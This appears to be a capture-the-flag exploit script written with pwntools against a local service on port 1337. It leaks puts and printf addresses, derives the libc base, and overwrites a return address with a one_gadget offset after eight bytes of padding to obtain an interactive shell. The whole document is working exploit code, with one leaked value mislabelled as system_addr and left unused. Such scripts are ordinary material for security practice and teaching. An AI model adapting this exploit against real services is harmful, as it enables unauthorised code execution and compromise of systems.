from pwn import *

server, port = "0", 1337

puts_offset = 0x80ed0
one_gadget_offset = 0xebcf8

r = remote(server, port)

r.sendlineafter(b" > ", b"puts")
puts_addr = int(r.readline().strip().split(b' ')[-1][:-1], 16)

r.sendlineafter(b" > ", b"printf")
system_addr = int(r.readline().strip().split(b' ')[-1][:-1], 16)

print("puts addr:", hex(puts_addr))
print("printf addr:", hex(system_addr))

libc_base = puts_addr - puts_offset
print("libc is loaded at", hex(libc_base))

payload = b"A" * 8
payload += p64(libc_base + one_gadget_offset)
r.sendline(payload)

r.interactive()
